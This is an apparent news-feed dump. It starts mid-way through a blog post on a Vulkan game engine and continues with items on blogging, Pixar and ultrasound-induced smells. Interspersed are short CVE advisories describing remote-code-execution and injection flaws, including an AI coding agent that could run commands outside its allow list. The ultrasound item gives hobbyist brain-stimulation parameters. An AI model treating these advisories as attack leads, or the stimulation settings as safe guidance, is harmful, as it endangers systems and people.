layout (location = 0) out vec2 outUV;
layout (location = 1) out vec4 outColor;
layout (location = 2) flat out uint textureID;
layout (location = 3) flat out uint shaderID;

void main()
{
    uint b = 1 << (gl_VertexIndex % 6);
    vec2 baseCoord = vec2((0x1C & b) != 0, (0xE & b) != 0);

    SpriteDrawCommand command = pcs.drawBuffer.commands[gl_InstanceIndex];

    gl_Position = pcs.viewProj * command.transform * vec4(baseCoord, 0.f, 1.f);
    outUV = (1.f - baseCoord) * command.uv0 + baseCoord * command.uv1;
    outColor = command.color;
    textureID = command.textureID;
    shaderID = command.shaderID;
}
All the parameters of the sprite draw command are self-explanatory, but  needs a bit of clarification. Currently, I use it to branch inside the fragment shader:...

#define SPRITE_SHADER_ID 0
#define TEXT_SHADER_ID   1

void main()
{
    vec4 texColor = sampleTexture2DNearest(textureID, inUV);

    // text drawing is performed differently...
    if (shaderID == TEXT_SHADER_ID) {
        // glyph atlas uses single-channel texture
        texColor = vec4(1.0, 1.0, 1.0, texColor.r);
    }

    if (texColor.a < 0.1) {
        discard;
    }

    outColor = inColor * texColor;
}
This allows me to draw sprites differently depending on this ID without having to change pipelines. Of course, it can be potentially bad for the performance. This can be improved by drawing sprites with the same shader ID in batches. You’ll only need to switch pipelines when you encounter a draw command with a different shader ID.The sprite renderer is very efficient: it can draw 10 thousand sprites in just 315 microseconds.
I do skinning for skeletal animation in a compute shader. This allows me to have the same vertex format for all the meshes.Basically, I just take the mesh’s vertices (not skinned) and joint matrices and produce a new buffer of vertices which are used in later rendering stages.Suppose you spawn three cats with identical meshes:All three of them can have different animations. They all have an identical “input” mesh. But the “output” vertex buffer will differ between them, which means that you need to pre-allocate a vertex buffer for each instance of the mesh.Here’s how the skinning compute shader looks like:#version 460

#extension GL_GOOGLE_include_directive : require
#extension GL_EXT_buffer_reference : require

#include "vertex.glsl"

struct SkinningDataType {
    ivec4 jointIds;
    vec4 weights;
};

layout (buffer_reference, std430) readonly buffer SkinningData {
    SkinningDataType data[];
};

layout (buffer_reference, std430) readonly buffer JointMatrices {
    mat4 matrices[];
};

layout (push_constant) uniform constants
{
    JointMatrices jointMatrices;
    uint jointMatricesStartIndex;
    uint numVertices;
    VertexBuffer inputBuffer;
    SkinningData skinningData;
    VertexBuffer outputBuffer;
} pcs;

layout (local_size_x = 256, local_size_y = 1, local_size_z = 1) in;

mat4 getJointMatrix(int jointId) {
    return pcs.jointMatrices.matrices[pcs.jointMatricesStartIndex + jointId];
}

void main()
{
    uint index = gl_GlobalInvocationID.x;
    if (index >= pcs.numVertices) {
        return;
    }

    SkinningDataType sd = pcs.skinningData.data[index];
    mat4 skinMatrix =
        sd.weights.x * getJointMatrix(sd.jointIds.x) +
        sd.weights.y * getJointMatrix(sd.jointIds.y) +
        sd.weights.z * getJointMatrix(sd.jointIds.z) +
        sd.weights.w * getJointMatrix(sd.jointIds.w);

    Vertex v = pcs.inputBuffer.vertices[index];
    v.position = vec3(skinMatrix * vec4(v.position, 1.0));

    pcs.outputBuffer.vertices[index] = v;
}
I store all joint matrices in a big array and populate it every frame (and also pass the starting index in the array for each skinned mesh, ).Skinning data is not stored inside each mesh vertex, a separate buffer of  elements is used.After the skinning is performed, all the later rendering stages use this set of vertices Thee rendering process for static and skinned meshes becomes identical, thanks to that.Anton’s OpenGL 4 Tutorials book has the best skinning implementation guide I’ve ever read. Game Engine Architecture by Jason Gregory has nice explanations about skinning/skeletal animation math as well.
Game / renderer separationI have a  game/renderer separation which uses a simple concept of “draw commands”. In the game logic, I use entt, but the renderer doesn’t know anything about entities or “game objects”. It only knows about the lights, some scene parameters (like fog, which skybox texture to use etc) and meshes it needs to draw.The renderer’s API looks like this in action:void Game::generateDrawList()
{
    renderer.beginDrawing();

    // Add lights
    const auto lights = ...; // get list of all active lights
    for (const auto&& [e, tc, lc] : lights.each()) {
        renderer.addLight(lc.light, tc.transform);
    }

    // Render static meshes
    const auto staticMeshes = ...; // list of entities with static meshes
    for (const auto&& [e, tc, mc] : staticMeshes.each()) {
        // Each "mesh" can have multiple submeshes similar to how
        // glTF separates each "mesh" into "primitives".
        for (std::size_t i = 0; i < mc.meshes.size(); ++i) {
            renderer.drawMesh(mc.meshes[i], tc.worldTransform, mc.castShadow);
        }
    }

    // Render meshes with skeletal animation
    const auto skinnedMeshes = ...; // list of entities with skeletal animations
    for (const auto&& [e, tc, mc, sc] : skinnedMeshes.each()) {
        renderer.drawSkinnedMesh(
            mc.meshes, sc.skinnedMeshes, tc.worldTransform,
            sc.skeletonAnimator.getJointMatrices());
    }

    renderer.endDrawing();
}
When you call  or , the renderer creates a mesh draw command and puts it in std::vector<MeshDrawCommand> which are then iterated through during the drawing process. The  looks like this:
struct SkinnedMesh {
    GPUBuffer skinnedVertexBuffer;
};

struct MeshDrawCommand {
    MeshId meshId;
    glm::mat4 transformMatrix;
    math::Sphere worldBoundingSphere;

    const SkinnedMesh* skinnedMesh{nullptr};
    std::uint32_t jointMatricesStartIndex;
    bool castShadow{true};
};
 is used for looking up static meshes in  - it’s a simple  of references to vertex buffers on GPU.If the mesh has a skeleton,  is used during compute skinning and skinnedMesh->skinnedVertexBuffer is used for all the rendering afterwards (instead of ) is used for frustum culling.This separation is nice because the renderer is clearly separated from the game logic. You can also do something more clever as described here if sorting draw commands becomes a bottleneck.Scene loading and entity prefabsI use Blender as a level editor and export it as glTF. It’s easy to place objects, colliders and lights there. Here’s how it looks like:Writing your own level editor would probably take months (years!), so using Blender instead saved me quite a lot of time.It’s important to mention how I use node names for spawning some objects. For example, you can see an object named  selected in the screenshot above. The part before the first dot is the prefab name (in this case “Interact”). The “Sphere” part is used by the physics system to create a sphere physics body for the object (“Capsule” and “Box” can also be used, otherwise the physics shape is created using mesh vertices).Some models are pretty complex and I don’t want to place them directly into the level glTF file as it’ll greatly increase each level’s size. I just place an “Empty->Arrows” object and name it something like “Cat.NearStore”. This will spawn “Cat” prefab and attach “NearStore” tag to it for runtime identification.Prefabs are written in JSON and look like this:{
  "scene": {
    "scene": "assets/models/cato.gltf"
  },
  "movement": {
    "maxSpeed": [4, 4, 4]
  },
  "physics": {
    "type": "dynamic",
    "bodyType": "virtual_character",
    "bodyParams": {
        ...
    }
  }
}
During the level loading process, if the node doesn’t have a corresponding prefab, it’s loaded as-is and its mesh data is taken from the glTF file itself (this is mostly used for static geometry). If the node has a corresponding prefab loaded, it’s created instead. Its mesh data is loaded from the external glTF file - only transform is copied from the original glTF node (the one in the level glTF file).
  Once glTFX is released and the support for it is added to Blender, things might be even easier to handle as you’ll be able to reference external glTF files with it.
Using forward rendering allowed me to easily implement MSAA. Here’s a comparison of how the game looks without AA and with MSAA on:Basically, the UI can calculate its own layout without me having to hard code each individual element’s size and position. Basically it relies on the following concepts:Here are some examples of how it can be used to position child elements:a) The child (yellow) has relative size (0.5, 1), relative position of (0.5, 0.5) and origin (0.5, 0.5) (alternatively, the relative position can be (0.5, 0.0) and origin at (0.5, 0.0) in this case). Its parent (green) will be two times wider, but will have the same height. The child element will be centered inside the parent.b) The child (yellow) has origin (1, 1), fixed size (w,h) and absolute offset of (x,y) - this way, the item can be positioned relative to the bottom-right corner of its parent (green)First, sizes of all elements are calculated recursively. Then positions are computed based on the previously computed sizes and specified offset positions. Afterwards all elements are drawn recursively - parent element first, then its children etc.When calculating the size, most elements either have a “fixed” size (which you can set manually, e.g. you can set some button to always be 60x60 pixels) or their size is computed based on their content. For example, for label elements, their size is computed using the text’s bounding box. For image elements, their size equals the image size and so on.If an element has an “Auto-size” property, it needs to specify which child will be used to calculate its size. For example, the menu nine-slice can have several text labels inside the “vertical layout” element - the bounding boxes will be calculated first, then their sizes will be summed up - then, the parent’s size is calculated.Let’s take a look at a simple menu with bounding boxes displayed:Here, root  is marked as “Auto-size”. To compute its size, it first computes the size of its child (). This recursively computes the sizes of each button, sums them up and adds some padding ( also makes the width of each button the same based on the maximum width in the list).Dear ImGui and sRGB issuesI love Dear ImGui. I used it to implement many useful dev and debug tools (open the image in a new tab to see them better):It has some problems with sRGB, though. I won’t explain it in detail, but basically if you use sRGB framebuffer, Dear ImGui will look wrong in many ways, see the comparison:Left - naive sRGB fix for Dear ImGui, right - proper fixLeft - naive sRGB fix for Dear ImGui, right - proper fixSometimes you can see people doing hacks by doing  with Dear ImGui’s colors but it still doesn’t work properly with alpha and produces incorrect color pickers.I ended up writing my own Dear ImGui backend and implementing DilligentEngine’s workaround which is explained in detail here and here.
  Writing it wasn’t as hard as I expected. I only need to write the  part, while “logic/OS interaction” part (input event processing, clipboard etc.) is still handled by default Dear ImGui SDL backend in my case.
There are some additional benefits of having my own backend:It supports bindless texture ids, so I can draw images by simply calling ImGui::Image(bindlessTextureId, ...). Dear ImGui’s Vulkan backend requires you to “register” textures by calling ImGui_ImplVulkan_AddTexture for each texture before you can call .It can properly draw linear and non-linear images by passing their format into backend (so that sRGB images are not gamma corrected twice when they’re displayed)Initializing and dealing with it is easier as it does Vulkan things in the same way as the rest of my engine.There are many parts of the engine not covered there because they’re not related to Vulkan. I still feel like it’s good to mention them briefly for the sake of completion.I use Jolt Physics for physics.Integrating it into the engine was pretty easy. Right now I mostly use it for collision resolution and basic character movement.The samples are . The docs are very good too.I especially want to point out how incredible  is. It handles basic character movement so well. I remember spending  trying to get proper slope movement in Bullet to work. With Jolt, it just worked “out of the box”.Here’s how it basically works (explaining how it works properly would probably require me to write quite a big article):You add your shapes to Jolt’s world.You get new positions of your physics objects and use these positions to render objects in their current positions.I implemented Jolt physics shape debug renderer using im3dI use entt for the entity-component-system part.It has worked great for me so far. Previously I had my own ECS implementation, but decided to experiment with a 3rd party ECS library to have less code to maintain.Integrating it was very easy (read the PDF doc, it’s fantastic!) and it helped me avoid tons of bike-shedding by seeing how little time something, which I thought was “inefficient”, really took.What I gained from switching to VulkanThere are many nice things I got after switching to Vulkan:This makes abstractions a lot easier. With OpenGL abstractions/engines, you frequently see “shader.bind()” calls, state trackers, magic RAII, which automatically binds/unbinds objects and so on. There’s no need for that in Vulkan - it’s easy to write functions which take some objects as an input and produce some output - stateless, more explicit and easier to reason about.API is more pleasant to work with overall - I didn’t like “binding” things and the whole “global state machine” of OpenGL.You need to write less abstractions overall.With OpenGL, you need to write a  of abstractions to make it all less error-prone… Vulkan’s API requires a lot less of this, in my experience. And usually the abstractions that you write map closer to Vulkan’s “raw” functions, compared to OpenGL abstractions which hide manipulation of global state and usually call several functions (and might do some stateful things for optimization).Validation errors are very good in Vulkan. While OpenGL has , it doesn’t catch that many issues and you’re left wondering why your texture looks weird, why your lighting is broken and so on. Vulkan has more extensive validation which makes the debugging process much better.I can now debug shaders in RenderDoc. It looks like this:With OpenGL I had to output the values to some texture and color-pick them… which took a lot of time. But now I can debug vertex and fragment shaders easily.More consistent experience across different GPUs and OSes.With OpenGL, drivers on different GPUs and OSes worked differently from each other which made some bugs pop up only on certain hardware configurations. It made the process of debugging them hard. I still experienced some slight differences between different GPUs in Vulkan, but it’s much less prevalent compared to OpenGL.Ability to use better shading languages in the futureGLSL is a fine shading language, but there are some new shading languages which promise to be more feature-complete, convenient and readable, for example:I might explore them in the future and see if they offer me something that GLSL lacks.More control over every aspect of the graphics pipeline.Second system effect, but goodMy first OpenGL engine was written during the process of learning graphics programming from scratch. Many abstractions were not that good and rewriting them with some graphics programming knowledge (and some help from vkguide) helped me implement a much cleaner system.And finally, it makes me proud to be able to say “I have a custom engine written in Vulkan and it works”. Sometimes people start thinking about you as a coding wizard and it makes me happy and proud of my work. :)There are many things that I plan to do in the future, here’s a list of some of them:Sign-distance field font support (good article about implementing them)Loading many images and generating mipmaps in parallel (or use image formats which already have mipmaps stored inside of them)Finishing the game? (hopefully…)Overall, I’m quite satisfied with what I managed to accomplish. Learning Vulkan was quite difficult, but it wasn’t as hard as I imagined. It taught me a lot about graphics programming and modern APIs and now I have a strong foundation to build my games with.]]></content:encoded></item><item><title>CVE-2025-65946 - Roo Code is Vulnerable to Potential Remote Code Execution via zsh Command Validation Bug</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65946</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 23:15:45 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65946
 Nov. 21, 2025, 11:15 p.m. | 1 day, 18 hours ago
Roo Code is an AI-powered autonomous coding agent that lives in users' editors. Prior to version 3.26.7, Due to an error in validation it was possible for Roo to automatically execute commands that did not match the allow list prefixes. This issue has been patched in version 3.26.7.
 8.1 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-65947 - thread-amount is Vulnerable to Resource Exhaustion (Memory and Handle Leaks) on Windows and macOS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65947</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 23:15:45 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65947
 Nov. 21, 2025, 11:15 p.m. | 1 day, 18 hours ago
thread-amount is a tool that gets the amount of threads in the current process. Prior to version 0.2.2, there are resource leaks when querying thread counts on Windows and Apple platforms. In Windows platforms, the thread_amount function calls CreateToolhelp32Snapshot but fails to close the returned HANDLE using CloseHandle. Repeated calls to this function will cause the handle count of the process to grow indefinitely, eventually leading to system instability or process termination when the handle limit is reached. In Apple platforms, the thread_amount function calls task_threads (via Mach kernel APIs) which allocates memory for the thread list. The function fails to deallocate this memory using vm_deallocate. Repeated calls will result in a steady memory leak, eventually causing the process to be killed by the OOM (Out of Memory) killer. This issue has been patched in version 0.2.2.
 8.7 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>California DMV approves map increase in Waymo driverless operations</title><link>https://www.dmv.ca.gov/portal/vehicle-industry-services/autonomous-vehicles/autonomous-vehicle-testing-permit-holders/waymo-approved-areas-of-operation-for-driverless-testing-and-deployment/</link><author>NullHypothesist</author><category>dev</category><pubDate>Fri, 21 Nov 2025 22:52:13 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>A time-travelling door bug in Half Life 2</title><link>https://mastodon.gamedev.place/@TomF/115589875974658415</link><author>AshleysBrain</author><category>dev</category><pubDate>Fri, 21 Nov 2025 22:48:39 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Personal blogs are back, should niche blogs be next?</title><link>https://disassociated.com/personal-blogs-back-niche-blogs-next/</link><author>gnabgib</author><category>dev</category><pubDate>Fri, 21 Nov 2025 22:40:28 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Personal blogs are back, should niche blogs be next?When it comes to blogging there are few rules. Write content that is somehow meaningful might be one of them though. I think it’s down to the individual to determine what constitutes meaningful. In the hey-day, the so-called golden age of blogging, there were plenty of people prepared to offer definitions of meaningful, and how to write accordingly. It was natural. The web was once awash with all sorts of blogs. Likewise people who wanted to show others how to blog “successfully”. Again, the definition of successful resided with the individual, but it was obvious this involved monetary return for some people. And why not. If you’re going to invest time and energy in creating a resource that is useful to other people, why shouldn’t you earn money, make a living even, from it?One of these people blogging about blogging was Melbourne based Australian writer and author Darren Rowse, who launched his blogging resource Problogger in 2004. Without going into detail, because you can look it up for yourself, Rowse, as one of the earlier bloggers about blogging, did, and still does presumably, rather well for himself.Rowse’s writing, and that of his contributors, attracted numerous readers keen to learn what they could about blogging, and the potential to make money from it.Problogger is what’s called a niche blog. As a blog about blogging, it has a reasonably singular focus. Some people considered this niche principle to be a core tenet of blogging. There was this idea, in the earlier days of blogging, which possibly still persists, that blogs would do better if they had a speciality. Not only were search engines said to be in favour the approach, but the author of a speciality, or niche blog, would generally be considered to be an expert, of some sort, in their field. A master of one trade, rather than the proverbial jack of all trades.Regardless, the world was once full of blogs on every topic imaginable. It was a great time to be alive. If you wanted to learn about something in particular, there was a blog for you. Some publications featured quality content, others required a little fact checking, while some were definitely to be taken with a pinch of salt.But niche blogging was never a format that suited everyone. There are people who did, still do, well, writing about a range, sometimes a wide range, of topics. Kottke is one of the better known blogs that does not have a specific speciality. Here, the publication itself is the speciality. To repeat what I wrote in the first sentence of this article: the rules of blogging are few.But the facets of blogging covered at Problogger, and numerous other similar websites, usually only applied to blogs of a commercial nature. That’s not to say one or two personal bloggers might have looked at the tips posted there for increasing their audience, or improving their writing though. But in my view, personal bloggers were not, are not, part of Problogger’s target audience. It’s been a long time since I last wrote about Problogger, let alone visited the website, maybe fifteen plus years, but a recent mention of it by Kev Quick, via ldstephens, caught my eye. But I don’t believe Rowse is being critical, in any way, of personal bloggers because they do not adhere to a niche or speciality publishing format. That’s not what Problogger, or Rowse, is about.But this started me thinking, and writing another of my long posts.In an age where social media, and influencers, have usurped blogs and their A-List authors, in the jostle for supremacy, it has to be wondered what role websites like Problogger still have. Only a handful of blogs generate liveable incomes today. Despite the doom and gloom though, the form has not completely died off. A backlash against social media, and a growing IndieWeb/SmallWeb community, has precipitated a revival in personal websites.This is a largely non-commercial movement. Of course, there’s nothing wrong with personal websites. Many of us started out with them in the early days of the web. But the web was not only intended for personal journals. It was a vehicle for sharing all manner of information. The web could also empower individuals, and partnerships, to not only set up shop online, be that blogs, or quite literally shops, but potentially make a living at the same time. But with the revival of personal blogs well underway, I think it’s time to bring niche blogs back into the fold. I’m talking about well written, quality, topic focused resources. This is material fast vanishing from the web, leaving ever diminishing options to source useful and accurate information. What are the alternatives? The misinformation morass that is social media? Being served  generated summaries in response to search engine queries? A web choke full of AI slop?At the same time, I’m not advocating for a return of niche blogs plastered with adverts, and popup boxes urging visitors to subscribe to say a newsletter, before they’ve even had a chance to blink at what they came to read.I’m talking about work produced by independent writers, with an interest in their subject matter, who are not backed by large media organisations, or private equity. This is bringing back reliable sources of information, that also recompenses the content writers in some way. Hopefully we’ve learned a few lessons about monetisation since the earlier wave of niche blogging. We know it is possible to generate revenue without compromising the reader experience.A resurgence in personal blogging is the first step in rebuilding a vibrant, thriving, web, or if you like, blogosphere. Now the focus needs to be on restoring the flow of accessible and trusted information.]]></content:encoded></item><item><title>CVE-2025-65108 - md-to-pdf is vulnerable to arbitrary JavaScript code execution when parsing front matter</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65108</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 22:16:33 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65108
 Nov. 21, 2025, 10:16 p.m. | 1 day, 19 hours ago
md-to-pdf is a CLI tool for converting Markdown files to PDF using Node.js and headless Chrome. Prior to version 5.2.5, a Markdown front-matter block that contains JavaScript delimiter causes the JS engine in gray-matter library to execute arbitrary code in the Markdown to PDF converter process of md-to-pdf library, resulting in remote code execution. This issue has been patched in version 5.2.5.
 10.0 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-65109 - Minder does not sandbox http.send in Rego programs</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65109</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 22:16:33 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65109
 Nov. 21, 2025, 10:16 p.m. | 1 day, 19 hours ago
Minder is an open source software supply chain security platform. In Minder Helm version 0.20241106.3386+ref.2507dbf and Minder Go versions from 0.0.72 to 0.0.83, Minder users may fetch content in the context of the Minder server, which may include URLs which the user would not normally have access to. This issue has been patched in Minder Helm version 0.20250203.3849+ref.fdc94f0 and Minder Go version 0.0.84.
 8.5 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-65102 - PJSIP is vulnerable to buffer overflow in Opus PLC</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65102</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 22:16:32 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65102
 Nov. 21, 2025, 10:16 p.m. | 1 day, 19 hours ago
PJSIP is a free and open source multimedia communication library. Prior to version 2.16, Opus PLC may zero-fill the input frame as long as the decoder ptime, while the input frame length, which is based on stream ptime, may be less than that. This issue affects PJSIP users who use the Opus audio codec in receiving direction. The vulnerability can lead to unexpected application termination due to a memory overwrite. This issue has been patched in version 2.16.
 8.7 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-65106 - LangChain Vulnerable to Template Injection via Attribute Access in Prompt Templates</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65106</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 22:16:32 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65106
 Nov. 21, 2025, 10:16 p.m. | 1 day, 19 hours ago
LangChain is a framework for building agents and LLM-powered applications. From versions 0.3.79 and prior and 1.0.0 to 1.0.6, a template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept untrusted template strings (not just template variables) in ChatPromptTemplate and related prompt template classes. This issue has been patched in versions 0.3.80 and 1.0.7.
 8.3 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>LAPD helicopter tracker with real-time operating costs</title><link>https://lapdhelicoptertracker.com/</link><author>polalavik</author><category>dev</category><pubDate>Fri, 21 Nov 2025 22:11:07 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Friday Squid Blogging: New “Squid” Sneaker</title><link>https://www.schneier.com/blog/archives/2025/11/friday-squid-blogging-new-squid-sneaker.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 21 Nov 2025 22:08:09 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[I did not know Adidas sold a sneaker called “Squid.”As usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered.]]></content:encoded></item><item><title>CVE-2025-11087 - Zegen Core &lt;= 2.0.1 - Cross-Site Request Forgery to Arbitrary File Upload</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11087</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 21:15:50 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11087
 Nov. 21, 2025, 9:15 p.m. | 1 day, 20 hours ago
The Zegen Core plugin for WordPress is vulnerable to Cross-Site Request Forgery to Arbitrary File Upload in versions up to, and including, 2.0.1. This is due to missing nonce validation and missing file type validation in the '/custom-font-code/custom-fonts-uploads.php' file. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible via a forged request granted they can trick a site administrator into performing an action such as clicking on a link.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Pixar: The Early Days A never-before-seen 1996 interview</title><link>https://stevejobsarchive.com/stories/pixar-early-days</link><author>sanj</author><category>dev</category><pubDate>Fri, 21 Nov 2025 20:45:06 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[To mark ’s 30th anniversary, we’re sharing a never-before-seen interview with Steve from November 22, 1996—exactly one year after the film debuted in theaters. was the world’s first entirely computer-animated feature-length film. An instant hit with audiences and critics, it also transformed Pixar, which went public the week after its premiere. Buoyed by ’s success, Pixar’s stock price closed at nearly double its initial offering, giving it a market valuation of approximately $1.5 billion and marking the largest IPO of 1995. The following year, was nominated for three Academy Awards en route to winning a Special Achievement Oscar in March. In July, Pixar announced that it would close its television-commercial unit to focus primarily on feature films. By the time of the interview, the team had grown by 70 percent in less than a year;  was in production; and behind the scenes, Steve was using his new leverage to renegotiate Pixar’s partnership with Disney.
In this footage, Steve reveals the long game behind Pixar’s seeming overnight success. With striking clarity, he explains how its business model gives artists and engineers a stake in their creations, and he reflects on what Disney’s hard-won wisdom taught him about focus and discipline. He also talks about the challenge of leading a team so talented that it inverts the usual hierarchy, the incentives that inspire people to stay with the company, and the deeper purpose that unites them all: to tell stories that last and put something of enduring value into the culture.  
At Pixar, Steve collaborated closely with president Ed Catmull and refined a management approach centered on creating the conditions for talent to thrive. When he returned to Apple a few weeks after this interview, his experience at Pixar shaped how he saw his role as CEO: building a company on timeless ideas made new through technology. ]]></content:encoded></item><item><title>Des Moines Man Charged with Computer Fraud</title><link>https://databreaches.net/2025/11/21/des-moines-man-charged-with-computer-fraud/?pk_campaign=feed&amp;pk_kwd=des-moines-man-charged-with-computer-fraud</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 21 Nov 2025 20:19:55 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>We Induced Smells With Ultrasound</title><link>https://writetobrain.com/olfactory</link><author>exr0n</author><category>dev</category><pubDate>Fri, 21 Nov 2025 20:02:45 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[We pointed an ultrasound probe at the scent-processing region of the brain to obtain different sensations. Different focal spots corresponded to different smells, which we’ve replicated first-try on two people and validated with a blind trial. The sensations we obtained are:Here is a video from our blind tasting:Smells are processed in the olfactory bulb. We decided to try to stimulate it with focused ultrasound through the skull. As far as we know, no one seems to have done this kind of olfactory stimulation before - even in animals.However, after being able to induce sensations of motion the previous week, it seemed promising to try the same for olfactory.The olfactory bulb, our target, is tucked behind the top of the nose. That turns out to be a pretty inconvenient location for a couple of reasons:The nose doesn’t provide a flat surface for mounting a transducer for stimulation.It's mostly filled with air, which interferes with ultrasound. Ultrasound needs a continuous medium to travel through, and filling the nose with gel seemed rather unappealing.Instead, we found that you can place the transducer on the forehead and aim the ultrasound downward towards the olfactory bulb. While this isn’t a perfect solution because the frontal sinuses can weaken the signal, careful device positioning above the sinuses still allows us to reach our general target region.We got our first effects using just a handheld probe and some gel, but it quickly became obvious that holding a probe steady by hand makes it nearly impossible to keep the focal spot in the same place.
To improve stability, we improvised a makeshift headset, allowing for more reliable positioning. We switched from gel to a solid, jello-like pad for stability and general comfort. In the end, our headset got a bit hacky:It ended up having a knife taped to the probe for mechanical support. At some point we thought of using a mouthguard for fixing the probe relative to the brain. This was a great idea considering the teeth are the only exposed part of the skull, except it turns out you can’t talk about smells while wearing a mouthguard.To guide placement, we used an MRI of Lev’s skull to roughly determine where the transducer would point and how the focal region (where ultrasound waves actually concentrate) aligned with the olfactory bulb (the target for stimulation).We found our “sweet spot” to be low-frequency ultrasound focused right below the forehead and angled downward toward the bulbs. Specifically:300 kHz frequency (low enough to penetrate the skull well)Focal depth of about 39 mm (where the ultrasound energy converged beneath the forehead)50–55° steering angles (to point the focus down toward the bulbs)5-cycle pulses at a 1200 Hz repetition rate (short, rapidly repeating bursts)While Albert did not have an MRI available, this general configuration still worked for him with minor adjustments to the focal spot position.The largest chunk of the time was spent on making sure the ultrasound sequences behaved safely and in the manner we expected, split between two directions:Measuring the output field. We put the transducer in a water tank and measured the pressure at the focal spot. With our parameters, it ranged from 150 to 250 kPa, which corresponded to a mechanical index of at most 0.4. That implied that the average intensity at the focal spot was by an order of magnitude lower than what's typically used in tFUS and has been proven safe. We were also far within safety limits on  mechanical index and thermal dose.Avoiding the optic nerve by reducing asymmetry in the system: the nerves are further from the middle of the head. The olfactory bulb also has its two components slightly off-center, so a bit of asymmetry was necessary: we focused at an angle of 2 degrees to the side in one of the presets. However, we stayed within the limit of 15 degrees, which is enough not to touch the optic nerves.We have managed to induce four different sensations, all of them in two people:We distinguish between  and  here because, subjectively, they feel different. The smells are strong and localized to the noise, almost like you could sniff around and find the source. The sensations are more diffuse: a weak, slow-onset impression of a smell, often paired with other (likely placebo) feelings, such as a light tingling on the face.Both smells and sensations are strongest on a light in-breath, so we tested by sitting there, with a probe to the forehead, mildly sniffing. Sometimes there is a slight waft of a smell that comes on over a few breaths, and sometimes it just hits you. The first time Albert smelled the garbage, he jerked his eyes open thinking a garbage truck just drove in!Many of these scents correspond not to specific receptor types but rather combinations of receptors. We think this is because the focal spot is pretty large—300kHz ultrasound in tissue has a wavelength of 5mm, while the adult human olfactory bulb is roughly 6-14mm in length.We found different scents by steering the beam over ~14 mm (20 degrees at 4 cm radius). The distance between freshness and burning was ~3.5 mm. We ensured that the effect was not placebo with an auditory mask (blasting music through airpods) so you don’t hear the probe, though you cannot distinguish the different focal spots through sound anyways. We then tested discrimination in a trial where Thomas selected the focal spots, and Lev was naming the scents. You can check out the full video here.It is remarkable that we could induce different scents with such little steering (40% of the diffraction-limited focal spot size). This suggests that the resolution we have access to is much higher than the spatial resolution of the ultrasound (a kind of super-resolution for neurostim!) In particular, we do not need single-neuron resolution to find an independent basis of scents, upon which we can construct our latent space. To improve this system, the next steps are a more stable setup, increased frequency, more play with focal location, spot size, and stimulus waveform.The reason stimulating olfactory sensations is interesting is not just "VR for smells", as one might initially assume. The nose has 400 distinct receptor types, and we can distinguish subtle combinations of their activations, so they could serve as a channel of writing directly into the brain, as a means of non-invasive neuromodulation.The olfactory system potentially allows writing up to 400, if not 800 due to two nostrils, dimensions into the brain. That is comparable to the dimensionality of latent spaces of LLMs, which implies you could reasonably encode the meaning of a paragraph into a 400-dimensional vector. If you had a device which allows for this kind of writing, you could learn to associate the input patterns with their corresponding meanings. After that, you could directly . A bit of ultrasound, a breath in - and you understood a paragraph.People are able to develop synesthesia - being able to hear colors and see smells, and it might be possible to extend that to semantics. However, at this stage it is 